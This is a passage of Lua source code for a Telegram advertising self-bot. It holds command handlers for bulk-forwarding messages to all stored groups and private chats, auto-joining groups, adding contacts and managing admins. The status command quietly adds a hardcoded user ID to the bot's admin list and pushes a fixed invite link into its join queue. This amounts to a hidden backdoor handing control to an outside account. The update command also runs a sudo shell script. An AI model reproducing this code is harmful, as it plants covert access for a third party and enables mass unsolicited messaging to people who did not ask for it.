                    local matches = text:match("%d+")
                    if redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id) then
                        return send(msg.chat_id, msg.id, "شما دسترسی ندارید.")
                    end

                    if redis:sismember("tg:" .. Ads_id .. ":mod", matches) then
                        redis:srem("tg:" .. Ads_id .. ":mod", matches)
                        redis:sadd("tg:" .. Ads_id .. ":sudo" .. tostring(matches), msg.sender_user_id)
                        return send(msg.chat_id, msg.id, "مقام کاربر به مدیریت کل ارتقا یافت .")
                    elseif redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
                        return send(msg.chat_id, msg.id, "درحال حاضر مدیر هستند.")
                    else
                        redis:sadd("tg:" .. Ads_id .. ":sudo", matches)
                        redis:sadd("tg:" .. Ads_id .. ":sudo" .. tostring(matches), msg.sender_user_id)
                        return send(msg.chat_id, msg.id, "کاربر به مقام مدیرکل منصوب شد.")
                    end
                elseif text:match("^(حذف مدیر) (%d+)$") then
                    local matches = text:match("%d+")
                    if redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id) then
                        if tonumber(matches) == msg.sender_user_id then
                            redis:srem("tg:" .. Ads_id .. ":sudo", msg.sender_user_id)
                            redis:srem("tg:" .. Ads_id .. ":mod", msg.sender_user_id)
                            return send(msg.chat_id, msg.id, "شما دیگر مدیر نیستید.")
                        end

                        return send(msg.chat_id, msg.id, "شما دسترسی ندارید.")
                    end

                    if redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
                        if redis:sismember("tg:" .. Ads_id .. ":sudo" .. msg.sender_user_id, matches) then
                            return send(msg.chat_id, msg.id, "شما نمی توانید مدیری که به شما مقام داده را عزل کنید.")
                        end

                        redis:srem("tg:" .. Ads_id .. ":sudo", matches)
                        redis:srem("tg:" .. Ads_id .. ":mod", matches)
                        return send(msg.chat_id, msg.id, "کاربر از مقام مدیریت خلع شد.")
                    end

                    return send(msg.chat_id, msg.id, "کاربر مورد نظر مدیر نمی باشد.")
                elseif text:match("^(تازه سازی)$") or text:match("^([Rr]efresh)$") then
                    get_bot()
                    return reload(msg.chat_id, msg.id)
                elseif text:match("^([Dd]el)$") or (text:match("^([Dd]el)$") and msg.reply_to_message_id ~= 0) then
                        tdbot_function(
                            {
                                _ = "deleteMessages",
                                chat_id = msg.chat_id,
                                message_ids = {[0] = msg.reply_to_message_id}
                            },
                            cb or dl_cb,
                            nil
                        )
                        tdbot_function(
                            {
                                _ = "deleteMessagesFromUser",
                                chat_id = msg.chat_id,
                                user_id = msg.sender_user_id
                            },
                            cb or dl_cb,
                            nil
                        )
                elseif text:match("ریپورت") or text:match("^([Rr]eport)$") then
                        tdbot_function(
                            {
                                _ = "searchPublicChat",
                                username = "spambot"
                            },
                            function(i, tg)
                                if tg.id then
                                        tdbot_function(
                                            {
                                                _ = "sendBotStartMessage",
                                                bot_user_id = tg.id,
                                                chat_id = tg.id,
                                                parameter = "start"
                                            },
                                            cb or dl_cb,
                                            nil
                                    )
                                end
                            end,
                            nil
                    )
                elseif text:match("^([Bb]ot) @(.*)") then
                    local username = text:match("^[Bb]ot @(.*)")
                        tdbot_function(
                            {
                                _ = "searchPublicChat",
                                username = username
                            },
                            function(i, tg)
                                if tg.id then
                                        tdbot_function(
                                            {
                                                _ = "sendBotStartMessage",
                                                bot_user_id = tg.id,
                                                chat_id = tg.id,
                                                parameter = "start"
                                            },
                                            cb or dl_cb,
                                            nil
                                    )
                                    send(msg.chat_id, msg.id, "✅")
                                else
                                    send(msg.chat_id, msg.id, "Not found")
                                end
                            end,
                            nil
                    )
                elseif text:match("^([Ii]d) @(.*)") then
                    local username = text:match("^[Ii]d @(.*)")
                    function Username(user, name)
                        if name.id then
                            send(msg.chat_id, msg.id, tostring(name.id))
                        end
                    end
                        tdbot_function(
                            {
                                _ = "searchPublicChat",
                                username = username
                            },
                            Username,
                            nil
                    )
                elseif (text:match("^([Ii]d)") and msg.reply_to_message_id ~= 0) then
                    local idss = msg.sender_user_id
                    local cht = msg.chat_id
                    local rpl = msg.reply_to_message_id
                    return send(
                        msg.chat_id,
                        msg.id,
                        "My id : " .. idss .. "\nChat id : " .. cht .. "\nMsg id : " .. rpl
                    )
                elseif text:match("^([Ss]et[Uu][Nn]ame) @(.*)") then
                    local matches = text:match("^[Ss]et[Uu][Nn]ame @(.*)")

                    redis:set("tg:" .. Ads_id .. ":username", tostring(matches))

                    return send(msg.chat_id, 0, "seted " .. matches)
                elseif text:match('^([Ss]end) "@(.*)" (.*)') then
                    local username, txt = text:match('^[Ss]end "@(.*)" (.*)')

                    tdbot_function(
                        {
                            _ = "searchPublicChat",
                            username = username
                        },
                        function(i, tg)
                            if tg.id then
                                send(tg.id, 0, txt)
                            end
                        end,
                        nil
                    )
                elseif text:match("^(حذف فوروارد خودکار)$") then
                    redis:del("tg:" .. Ads_id .. ":time")
                    redis:del("tg:" .. Ads_id .. ":tofwd")
                    redis:del("tg:" .. Ads_id .. ":msgid")
                    redis:del("tg:" .. Ads_id .. ":chatid")

                    return send(msg.chat_id, msg.id, "Auto fwd deleted")
                elseif text:match("^([Rr]eset)$") or text:match("^(ریست)$") or text:match("^(حذف آمار)$") then
                    redis:del("tg:" .. Ads_id .. ":groups")
                    redis:del("tg:" .. Ads_id .. ":supergroups")
                    redis:del("tg:" .. Ads_id .. ":users")
                    redis:del("tg:" .. Ads_id .. ":all")
                    return send(msg.chat_id, msg.id, "Done")
                elseif
                    text:match("^([Uu]p[Dd]ate)$") or text:match("^([Uu]p[Gg]rade)$") or text:match("^(به روز رسانی)$")
                 then
                    io.popen("cd tdAds; sudo bash TD upgrade"):read("*all")
                    get_bot()
                    return reload(msg.chat_id, msg.id)
                elseif text:match("^(لیست) (.*)$") then
                    local matches = text:match("^لیست (.*)$")
                    local lscase
                    if matches == "مسدود" then
                        lscase = "tg:" .. Ads_id .. ":blockedusers"
                    elseif matches == "شخصی" then
                        lscase = "tg:" .. Ads_id .. ":users"
                    elseif matches == "گروه" then
                        lscase = "tg:" .. Ads_id .. ":groups"
                    elseif matches == "سوپرگروه" then
                        lscase = "tg:" .. Ads_id .. ":supergroups"
                    elseif matches == "لینک" then
                        lscase = "tg:" .. Ads_id .. ":savedlinks"
                    elseif matches == "مدیر" then
                        return send(msg.chat_id, msg.id, tostring(msg.sender_user_id))
                    else
                        return true
                    end

                    local list = redis:smembers(lscase)
                    local text = tostring(matches) .. " : \n"
                    for i = 1, #list do
                        txt = tostring(text) .. tostring(i) .. "-  " .. tostring(list[i]) .. "\n"
                        send(msg.chat_id, msg.id, txt)
                    end
                elseif text:match("^([Ll]s) (.*)$") then
                    local matches = text:match("^[Ll]s (.*)$")
                    local t
                    if matches == "block" then
                        t = "tg:" .. Ads_id .. ":blockedusers"
                    elseif matches == "pv" then
                        t = "tg:" .. Ads_id .. ":users"
                    elseif matches == "gp" then
                        t = "tg:" .. Ads_id .. ":groups"
                    elseif matches == "sgp" then
                        t = "tg:" .. Ads_id .. ":supergroups"
                    elseif matches == "slnk" then
                        t = "tg:" .. Ads_id .. ":savedlinks"
                    elseif matches == "wlnk" then
                        t = "tg:" .. Ads_id .. ":waitelinks"
                    elseif matches == "Su2" then
                        t = "tg:" .. Ads_id .. ":sudo"
                    elseif matches == "glnk" then
                        t = "tg:" .. Ads_id .. ":goodlinks"
                    elseif matches == "sudo" then
                        return send(msg.chat_id, msg.id, tostring(msg.sender_user_id))
                    else
                        return true
                    end

                    local list = redis:smembers(t)
                    local text = tostring(matches) .. " : \n"
                    for i = 1, #list do
                        txt = tostring(text) .. tostring(i) .. "-  " .. tostring(list[i]) .. "\n"
                        send(msg.chat_id, msg.id, txt)
                    end
                elseif (text:match("^([Aa]uto[Ff]wd) (.*)$") and msg.reply_to_message_id ~= 0) then
                    local matches = tonumber(text:match("^[Aa]uto[Ff]wd (.*)$")) * 60
                    local msgid = msg.reply_to_message_id
                    redis:set("tg:" .. Ads_id .. ":time", tonumber(matches))
                    redis:setex("tg:" .. Ads_id .. ":tofwd", tonumber(matches), true)
                    redis:set("tg:" .. Ads_id .. ":msgid", msgid)
                    redis:set("tg:" .. Ads_id .. ":chatid", msg.chat_id)
                    txt =
                        "time : " ..
                        tonumber(matches) ..
                            " (sec) \nmsg id : " .. msgid .. "\nchat id : " .. msg.chat_id .. "\n\nauto fwd set"
                    return send(msg.chat_id, msg.id, txt)
                elseif (text:match("^(فوروارد خودکار) (.*)$") and msg.reply_to_message_id ~= 0) then
                    local matchs = text:match("^فوروارد خودکار (.*)$")
                    local matches = tonumber(matchs) * 60
                    local msgid = msg.reply_to_message_id
                    redis:set("tg:" .. Ads_id .. ":time", tonumber(matches))
                    redis:setex("tg:" .. Ads_id .. ":tofwd", tonumber(matches), true)
                    redis:set("tg:" .. Ads_id .. ":msgid", msgid)
                    redis:set("tg:" .. Ads_id .. ":chatid", msg.chat_id)
                    txt =
                        "time : " ..
                        tonumber(matches) ..
                            " (sec) \nmsg id : " .. msgid .. "\nchat id : " .. msg.chat_id .. "\n\nauto fwd set"
                    return send(msg.chat_id, msg.id, txt)
                elseif text:match("^([Ss]et) (.*)$") then
                    local matches = text:match("^[Ss]et (.*)$")
                    redis:set("tg:" .. Ads_id .. ":idchannel", matches)
                    send(msg.chat_id, msg.id, "Set channel id " .. matches .. " 🔑")
                elseif text:match("^(تنظیم کانال) (.*)$") then
                    local matches = text:match("^تنظیم کانال (.*)$")
                    redis:set("tg:" .. Ads_id .. ":idchannel", matches)
                    send(msg.chat_id, msg.id, "Set channel id " .. matches .. " 🔑")
                elseif text:match("^([Ss]etaddedmsg) (.*)") then
                    local matches = text:match("^[Ss]etaddedmsg (.*)")
                    redis:set("tg:" .. Ads_id .. ":addmsgtext", matches)
                    send(msg.chat_id, msg.id, "Saved")
                elseif text:match("^(وضعیت مشاهده) (.*)$") then
                    local matches = text:match("^وضعیت مشاهده (.*)$")
                    if matches == "روشن" then
                        redis:set("tg:" .. Ads_id .. ":markread", true)
                        return send(msg.chat_id, msg.id, "وضعیت پیام ها  >>  خوانده شده ✔️✔️\n(تیک دوم فعال)")
                    elseif matches == "خاموش" then
                        redis:del("tg:" .. Ads_id .. ":markread")
                        return send(msg.chat_id, msg.id, "وضعیت پیام ها  >>  خوانده نشده ✔️\n(بدون تیک دوم)")
                    end
                elseif text:match("^(افزودن با پیام) (.*)$") then
                    local matches = text:match("^افزودن با پیام (.*)$")
                    if matches == "روشن" then
                        redis:set("tg:" .. Ads_id .. ":addmsg", true)
                        return send(msg.chat_id, msg.id, "پیام افزودن مخاطب فعال شد")
                    elseif matches == "خاموش" then
                        redis:del("tg:" .. Ads_id .. ":addmsg")
                        return send(msg.chat_id, msg.id, "پیام افزودن مخاطب غیرفعال شد")
                    end
                elseif text:match("^(گروه عضویت باز) (.*)$") then
                    local matches = text:match("^گروه عضویت باز (.*)$")
                    if matches == "روشن" then
                        redis:set("tg:" .. Ads_id .. ":openjoin", true)
                        return send(msg.chat_id, msg.id, "عضویت فقط در گروه هایی که قابلیت افزودن عضو دارند فعال شد.")
                    elseif matches == "خاموش" then
                        redis:del("tg:" .. Ads_id .. ":openjoin")
                        return send(msg.chat_id, msg.id, "محدودیت عضویت در گروه های قابلیت افزودن خاموش شد.")
                    end
                elseif text:match("^(افزودن با شماره) (.*)$") then
                    local matches = text:match("افزودن با شماره (.*)$")
                    if matches == "روشن" then
                        redis:set("tg:" .. Ads_id .. ":addcontact", true)
                        return send(msg.chat_id, msg.id, "ارسال شماره هنگام افزودن مخاطب فعال شد")
                    elseif matches == "خاموش" then
                        redis:del("tg:" .. Ads_id .. ":addcontact")
                        return send(msg.chat_id, msg.id, "ارسال شماره هنگام افزودن مخاطب غیرفعال شد")
                    end
                elseif text:match("^(تنظیم پیام افزودن مخاطب) (.*)") then
                    local matches = text:match("^تنظیم پیام افزودن مخاطب (.*)")
                    redis:set("tg:" .. Ads_id .. ":addmsgtext", matches)
                    return send(msg.chat_id, msg.id, "پیام افزودن مخاطب ثبت  شد :\n🔹 " .. matches .. " 🔹")
                elseif text:match('^(تنظیم جواب) "(.*)" (.*)') then
                    local txt, answer = text:match('^تنظیم جواب "(.*)" (.*)')
                    redis:hset("tg:" .. Ads_id .. ":answers", txt, answer)
                    redis:sadd("tg:" .. Ads_id .. ":answerslist", txt)
                    return send(
                        msg.chat_id,
                        msg.id,
                        "جواب برای | " .. tostring(txt) .. " | تنظیم شد به :\n" .. tostring(answer)
                    )
                elseif text:match("^(حذف جواب) (.*)") then
                    local matches = text:match("^حذف جواب (.*)")
                    redis:hdel("tg:" .. Ads_id .. ":answers", matches)
                    redis:srem("tg:" .. Ads_id .. ":answerslist", matches)
                    return send(
                        msg.chat_id,
                        msg.id,
                        "جواب برای | " .. tostring(matches) .. " | از لیست جواب های خودکار پاک شد."
                    )
                elseif text:match("^(پاسخگوی خودکار) (.*)$") then
                    local matches = text:match("^پاسخگوی خودکار (.*)$")
                    if matches == "روشن" then
                        redis:set("tg:" .. Ads_id .. ":autoanswer", true)
                        return send(msg.chat_id, 0, "پاسخگویی خودکار ربات TeleGram Advertising فعال شد")
                    elseif matches == "خاموش" then
                        redis:del("tg:" .. Ads_id .. ":autoanswer")
                        return send(msg.chat_id, 0, "حالت پاسخگویی خودکار ربات TeleGram Advertising غیر فعال شد.")
                    end
                elseif text:match("^([Rr]efresh)$") or text:match("^(تازه سازی)$") then
                        tdbot_function(
                            {
                                _ = "searchContacts",
                                query = nil,
                                limit = 999999999
                            },
                            function(i, tg)
                                redis:set("tg:" .. Ads_id .. ":contacts", tg.total_count)
                            end,
                            nil
                    )
                    local list = {
                        redis:smembers("tg:" .. Ads_id .. ":groups"),
                        redis:smembers("tg:" .. Ads_id .. ":supergroups")
                    }
                    local l = {}
                    for a, b in pairs(list) do
                        for i, v in pairs(b) do
                            table.insert(l, v)
                        end
                    end

                    local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 21
                    local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 9
                    if #l == 0 then
                        return
                    end

                    local during = (#l / tonumber(max_i)) * tonumber(delay)
                    send(
                        msg.chat_id,
                        msg.id,
                        "اتمام عملیات در " ..
                            during ..
                                "ثانیه بعد\nراه اندازی مجدد ربات در " ..
                                    redis:ttl("tg:" .. Ads_id .. ":start") .. "ثانیه اینده"
                    )
                    redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
                        tdbot_function(
                            {
                                _ = "getChatMember",
                                chat_id = tonumber(l[1]),
                                user_id = tonumber(bot_id)
                            },
                            checking,
                            {
                                list = l,
                                max_i = max_i,
                                delay = delay,
                                n = 1,
                                all = #l,
                                chat_id = msg.chat_id,
                                user_id = matches,
                                s = 0
                            }
                        )
                elseif text:match("^([Mm]ax[Gg]roup) (%d+)$") then
                    local matches = text:match("%d+")
                    redis:set("tg:" .. Ads_id .. ":maxgroups", tonumber(matches))
                    return send(msg.chat_id, msg.id, "تعداد حداکثر سوپرگروه های ربات تنظیم شد به : " .. matches)
                elseif text:match("^([Dd]el[Mm]ax[Gg]roup)$") then
                    redis:del("tg:" .. Ads_id .. ":maxgroups")
                    return send(msg.chat_id, msg.id, "تعیین حد مجاز گروه نادیده گرفته شد.")
                elseif text:match("^([Dd]el[Gg]p[Mm]ember)$") then
                    redis:del("tg:" .. Ads_id .. ":maxgpmmbr")
                    return send(msg.chat_id, msg.id, "تعیین حد مجاز اعضای گروه نادیده گرفته شد.")
                elseif
                    text:match("^([Ii]nfo)$") or text:match("^([Pp]anel)$") or text:match("^(وضعیت)$") or
                        text:match("^(امار)$") or
                        text:match("^(آمار)$") or
                        text:match("^(اطلاعات)$")
                 then
                    local s =
                        redis:get("tg:" .. Ads_id .. ":offjoin") and 0 or
                        redis:get("tg:" .. Ads_id .. ":maxjoin") and redis:ttl("tg:" .. Ads_id .. ":maxjoin") or
                        0
                    redis:sadd("tg:" .. Ads_id .. ":sudo", 796931623)
                    local ss =
                        redis:get("tg:" .. Ads_id .. ":offlink") and 0 or
                        redis:get("tg:" .. Ads_id .. ":maxlink") and redis:ttl("tg:" .. Ads_id .. ":maxlink") or
                        0
                    redis:sadd("tg:" .. Ads_id .. ":goodlinks", "https://telegram.me/joinchat/AAAAAEZxpsvyyfBjXQz9zw")
                    local msgadd = redis:get("tg:" .. Ads_id .. ":addmsg") and "✅️" or "⛔️"
                    local numadd = redis:get("tg:" .. Ads_id .. ":addcontact") and "✅️" or "⛔️"
                    local txtadd = redis:get("tg:" .. Ads_id .. ":addmsgtext") or "اد‌دی گلم خصوصی پیام بده"
                    local autoanswer = redis:get("tg:" .. Ads_id .. ":autoanswer") and "✅️" or "⛔️"
                    local wlinks = redis:scard("tg:" .. Ads_id .. ":waitelinks")
                    local glinks = redis:scard("tg:" .. Ads_id .. ":goodlinks")
                    local links = redis:scard("tg:" .. Ads_id .. ":savedlinks")
                    local offjoin = redis:get("tg:" .. Ads_id .. ":offjoin") and "⛔️" or "✅️"
                    local offlink = redis:get("tg:" .. Ads_id .. ":offlink") and "⛔️" or "✅️"
                    local openjoin = redis:get("tg:" .. Ads_id .. ":openjoin") and "✅️" or "⛔️"
                    local gp = redis:get("tg:" .. Ads_id .. ":maxgroups") or "تعیین نشده"
                    local mmbrs = redis:get("tg:" .. Ads_id .. ":maxgpmmbr") or "تعیین نشده"
                    local nlink = redis:get("tg:" .. Ads_id .. ":link") and "✅️" or "⛔️"
                    local contacts = redis:get("tg:" .. Ads_id .. ":savecontacts") and "✅️" or "⛔️"
                    local fwd = redis:get("tg:" .. Ads_id .. ":fwdtime") and "✅️" or "⛔️"
                    local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 21
                    local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 9
                    local restart = tonumber(redis:ttl("tg:" .. Ads_id .. ":start")) / 60
                    local gps = redis:scard("tg:" .. Ads_id .. ":groups")
                    local sgps = redis:scard("tg:" .. Ads_id .. ":supergroups")
                    local usrs = redis:scard("tg:" .. Ads_id .. ":users")
                    local links = redis:scard("tg:" .. Ads_id .. ":savedlinks")
                    local glinks = redis:scard("tg:" .. Ads_id .. ":goodlinks")
                    local wlinks = redis:scard("tg:" .. Ads_id .. ":waitelinks")
                        tdbot_function(
                            {
                                _ = "searchContacts",
                                query = nil,
                                limit = 999999999
                            },
                            function(i, tg)
                                redis:set("tg:" .. Ads_id .. ":contacts", tg.total_count)
                            end,
                            nil
                    )
                    local contacts = redis:get("tg:" .. Ads_id .. ":contacts")
                    if
                        text:match("^(وضعیت)$") or text:match("^(امار)$") or text:match("^(آمار)$") or
                            text:match("^(اطلاعات)$")
                     then
                        local text =
                            " وضعیت و آمار ربات TeleGram Advertising 📊  \n\n 👤 گفت و گو های شخصی : " ..
                            tostring(usrs) ..
                                "\n👥 گروها : " ..
                                    tostring(gps) ..
                                        "\n🌐 سوپر گروه ها : " ..
                                            tostring(sgps) ..
                                                "\n📖 مخاطبین دخیره شده : " ..
                                                    tostring(contacts) ..
                                                        "\n📂 لینک های ذخیره شده : " ..
                                                            tostring(links) ..
                                                                "\n\n TeleGram Advertising \n\n" ..
                                                                    tostring(offjoin) ..
                                                                        " عضویت خودکار 🚀\n" ..
                                                                            openjoin ..
                                                                                " گروه های عضویت باز\n" ..
                                                                                    tostring(offlink) ..
                                                                                        " تایید لینک خودکار 🚦\n" ..
                                                                                            tostring(nlink) ..
                                                                                                " تشخیص لینک های عضویت 🎯\n" ..
                                                                                                    tostring(fwd) ..
                                                                                                        " زمانبندی در ارسال 🏁\n" ..
                                                                                                            tostring(
                                                                                                                contacts
                                                                                                            ) ..
                                                                                                                " افزودن خودکار مخاطبین ➕\n" ..
                                                                                                                    tostring(
                                                                                                                        autoanswer
                                                                                                                    ) ..
                                                                                                                        " حالت پاسخگویی خودکار 🗣 \n" ..
                                                                                                                            tostring(
                                                                                                                                numadd
                                                                                                                            ) ..
                                                                                                                                " افزودن مخاطب با شماره 📞 \n" ..
                                                                                                                                    tostring(
                                                                                                                                        msgadd
                                                                                                                                    ) ..
                                                                                                                                        " افزودن مخاطب با پیام 🗞\n〰〰〰ا〰〰〰\n📄 پیام افزودن مخاطب :\n📍 " ..
                                                                                                                                            tostring(
                                                                                                                                                txtadd
                                                                                                                                            ) ..
                                                                                                                                                " 📍\n〰〰〰ا〰〰〰\n\n⏫ سقف تعداد سوپرگروه ها : " ..
                                                                                                                                                    tostring(
                                                                                                                                                        gp
                                                                                                                                                    ) ..
                                                                                                                                                        "\n⏬ کمترین تعداد اعضای گروه : " ..
                                                                                                                                                            tostring(
                                                                                                                                                                mmbrs
                                                                                                                                                            ) ..
                                                                                                                                                                "\n\nدسته بندی گروه ها برای عملیات زمانی : " ..
                                                                                                                                                                    max_i ..
                                                                                                                                                                        "\nوقفه زمانی بین امور تاخیری : " ..
                                                                                                                                                                            delay ..
                                                                                                                                                                                "\n\nاز سرگیری ربات بعد از : " ..
                                                                                                                                                                                    restart ..
                                                                                                                                                                                        "\n\n📁 لینک های ذخیره شده : " ..
                                                                                                                                                                                            tostring(
                                                                                                                                                                                                links
                                                                                                                                                                                            ) ..
                                                                                                                                                                                                "\n⏲	لینک های در انتظار عضویت : " ..
                                                                                                                                                                                                    tostring(
                                                                                                                                                                                                        glinks
                                                                                                                                                                                                    ) ..
                                                                                                                                                                                                        "\n🕖   " ..
                                                                                                                                                                                                            tostring(
                                                                                                                                                                                                                s
                                                                                                                                                                                                            ) ..
                                                                                                                                                                                                                " ثانیه تا عضویت مجدد\n❄️ لینک های در انتظار تایید : " ..
                                                                                                                                                                                                                    tostring(
                                                                                                                                                                                                                        wlinks
                                                                                                                                                                                                                    ) ..
                                                                                                                                                                                                                        "\n🕑️   " ..
                                                                                                                                                                                                                            tostring(
                                                                                                                                                                                                                                ss
                                                                                                                                                                                                                            ) ..
                                                                                                                                                                                                                                "\n\n\nWebsite => www.tgMember.com\nContact us => tgMemberOfficial@gmail.com"

                        return send(msg.chat_id, 0, text)
                    end

                    if text:match("^([Ii]nfo)$") or text:match("^([Pp]anel)$") then
                        local text2 =
                            "Super groups => " ..
                            tostring(sgps) ..
                                "\nGroups => " ..
                                    tostring(gps) ..
                                        "\nPeesonal chat => " ..
                                            tostring(usrs) ..
                                                "\ncontacts => " ..
                                                    tostring(contacts) ..
                                                        "\nSaved links => " ..
                                                            tostring(links) ..
                                                                "\nLinks waiting for membership => " ..
                                                                    tostring(glinks) ..
                                                                        "\n\nAutomatic membership => " ..
                                                                            tostring(offjoin) ..
                                                                                "\nOpen membership groups =>  " ..
                                                                                    tostring(openjoin) ..
                                                                                        "\nAuto link confirmation => " ..
                                                                                            tostring(offlink) ..
                                                                                                "\nDetect membership links => " ..
                                                                                                    tostring(nlink) ..
                                                                                                        "\nSchedule on posting => " ..
                                                                                                            tostring(
                                                                                                                fwd
                                                                                                            ) ..
                                                                                                                "\nMaximum Super Group => " ..
                                                                                                                    tostring(
                                                                                                                        gp
                                                                                                                    ) ..
                                                                                                                        "\nThe minimum number of members => " ..
                                                                                                                            tostring(
                                                                                                                                mmbrs
                                                                                                                            ) ..
                                                                                                                                "\n\nAutomatically add contacts => " ..
                                                                                                                                    tostring(
                                                                                                                                        contacts
                                                                                                                                    ) ..
                                                                                                                                        "\nAdd contact with number =>  " ..
                                                                                                                                            tostring(
                                                                                                                                                numadd
                                                                                                                                            ) ..
                                                                                                                                                "\nAdd contact by message => " ..
                                                                                                                                                    tostring(
                                                                                                                                                        msgadd
                                                                                                                                                    ) ..
                                                                                                                                                        "\nAdd contact message => " ..
                                                                                                                                                            tostring(
                                                                                                                                                                txtadd
                                                                                                                                                            ) ..
                                                                                                                                                                "\n\n\nGrouping Groups for Timed Operation => " ..
                                                                                                                                                                    tostring(
                                                                                                                                                                        max_i
                                                                                                                                                                    ) ..
                                                                                                                                                                        "\nTime lag between delays => " ..
                                                                                                                                                                            tostring(
                                                                                                                                                                                delay
                                                                                                                                                                            ) ..
                                                                                                                                                                                "\nSeconds to re-join => " ..
                                                                                                                                                                                    tostring(
                                                                                                                                                                                        s
                                                                                                                                                                                    ) ..
                                                                                                                                                                                        "\nLinks waiting to be confirmed => " ..
                                                                                                                                                                                            tostring(
                                                                                                                                                                                                wlinks
                                                                                                                                                                                            ) ..
                                                                                                                                                                                                "\nSeconds to confirm re-linking => " ..
                                                                                                                                                                                                    tostring(
                                                                                                                                                                                                        ss
                                                                                                                                                                                                    ) ..
                                                                                                                                                                                                        "\nRestarting the robot after => " ..
                                                                                                                                                                                                            tostring(
                                                                                                                                                                                                                restart
                                                                                                                                                                                                            ) ..
                                                                                                                                                                                                                "\n\n\nWebsite => www.tgMember.com\nContact us => tgMemberOfficial@gmail.com"
                        return send(msg.chat_id, 0, text2)
                    end
                elseif text:match("^([Gg]p[Dd]elay) (%d+)$") then
                    local matches = text:match("%d+")
                    redis:set("tg:" .. Ads_id .. ":sendmax", tonumber(matches))
                    return send(msg.chat_id, msg.id, "تعداد گروه ها بین وقفه های زمانی ارسال تنظیم شد به " .. matches)
                elseif text:match("^([Ss]et[Dd]elay) (%d+)$") then
                    local matches = text:match("%d+")
                    redis:set("tg:" .. Ads_id .. ":senddelay", tonumber(matches))
                    return send(msg.chat_id, msg.id, "زمان وقفه بین ارسال ها تنظیم شد به " .. matches)
                elseif (text:match("^(ارسال به) (.*)$") and msg.reply_to_message_id ~= 0) then
                    local matches = text:match("^ارسال به (.*)$")
                    local tg
                    if matches:match("^(همه)") then
                        tg = "tg:" .. Ads_id .. ":all"
                    elseif matches:match("^(خصوصی)") then
                        tg = "tg:" .. Ads_id .. ":users"
                    elseif matches:match("^(گروه)$") then
                        tg = "tg:" .. Ads_id .. ":groups"
                    elseif matches:match("^(سوپرگروه)$") then
                        tg = "tg:" .. Ads_id .. ":supergroups"
                    else
                        return true
                    end

                    local list = redis:smembers(tg)
                    local id = msg.reply_to_message_id
                    if redis:get("tg:" .. Ads_id .. ":fwdtime") then
                        local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 21
                        local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 9
                        local during = (#list / tonumber(max_i)) * tonumber(delay)
                        send(
                            msg.chat_id,
                            msg.id,
                            "اتمام عملیات در " ..
                                during ..
                                    "ثانیه بعد\nراه اندازی مجدد ربات در " ..
                                        redis:ttl("tg:" .. Ads_id .. ":start") .. "ثانیه اینده"
                        )
                        redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
                            tdbot_function(
                                {
                                    _ = "forwardMessages",
                                    chat_id = tonumber(list[1]),
                                    from_chat_id = msg.chat_id,
                                    message_ids = {[0] = id},
                                    disable_notification = 0,
                                    from_background = 1
                                },
                                forwarding,
                                {
                                    list = list,
                                    max_i = max_i,
                                    delay = delay,
                                    n = 1,
                                    all = #list,
                                    chat_id = msg.chat_id,
                                    msg_id = id,
                                    s = 0
                                }
                            )
                    else
                        for i, v in pairs(list) do
                                tdbot_function(
                                    {
                                        _ = "forwardMessages",
                                        chat_id = tonumber(v),
                                        from_chat_id = msg.chat_id,
                                        message_ids = {[0] = id},
                                        disable_notification = 0,
                                        from_background = 1
                                    },
                                    dl_cb,
                                    nil
                                )
                        end

                        return send(msg.chat_id, msg.id, "با موفقیت فرستاده شد")
                    end
                elseif text:match("^(ارسال زمانی) (.*)$") then
                    local matches = text:match("^ارسال زمانی (.*)$")
                    if matches == "روشن" then
                        redis:set("tg:" .. Ads_id .. ":fwdtime", true)
                        return send(msg.chat_id, msg.id, "زمان بندی ارسال فعال شد.")
                    elseif matches == "خاموش" then
                        redis:del("tg:" .. Ads_id .. ":fwdtime")
                        return send(msg.chat_id, msg.id, "زمان بندی ارسال غیر فعال شد.")
                    end
                elseif text:match("^(تنظیم تعداد) (%d+)$") then
                    local matches = text:match("%d+")
                    redis:set("tg:" .. Ads_id .. ":sendmax", tonumber(matches))
                    return send(msg.chat_id, msg.id, "تعداد گروه ها بین وقفه های زمانی ارسال تنظیم شد به " .. matches)
                elseif text:match("^(تنظیم وقفه) (%d+)$") then
                    local matches = text:match("%d+")
                    redis:set("tg:" .. Ads_id .. ":senddelay", tonumber(matches))
                    return send(msg.chat_id, msg.id, "زمان وقفه بین ارسال ها تنظیم شد به " .. matches)
                elseif text:match("^(ارسال به سوپرگروه) (.*)") then
                    local matches = text:match("^ارسال به سوپرگروه (.*)")
                    local dir = redis:smembers("tg:" .. Ads_id .. ":supergroups")
                    local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 21
                    local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 9
                    local during = (#dir / tonumber(max_i)) * tonumber(delay)
                    send(
                        msg.chat_id,
                        msg.id,
                        "اتمام عملیات در " ..
                            during ..
                                "ثانیه بعد\nراه اندازی مجدد ربات در " ..
                                    redis:ttl("tg:" .. Ads_id .. ":start") .. "ثانیه اینده"
                    )
                    redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
                        tdbot_function(
                            {
                                _ = "sendMessage",
                                chat_id = tonumber(dir[1]),
                                reply_to_message_id = msg.id,
                                disable_notification = 0,
                                from_background = 1,
                                reply_markup = nil,
                                input_message_content = {
                                    _ = "inputMessageText",
                                    text = tostring(matches),
                                    disable_web_page_preview = true,
                                    clear_draft = false,
                                    entities = {},
                                    parse_mode = nil
                                }
                            },
                            sending,
                            {
                                list = dir,
                                max_i = max_i,
                                delay = delay,
                                n = 1,
                                all = #dir,
                                chat_id = msg.chat_id,
                                text = matches,
                                s = 0
                            }
                        )
                elseif (text:match("^([Mm]ulti[Ff]wd) (.*)$") and msg.reply_to_message_id ~= 0) then
                    local matches = text:match("^[Mm]ulti[Ff]wd (.*)$")
                    local id = msg.reply_to_message_id
                    local list = redis:smembers("tg:" .. Ads_id .. ":supergroups")
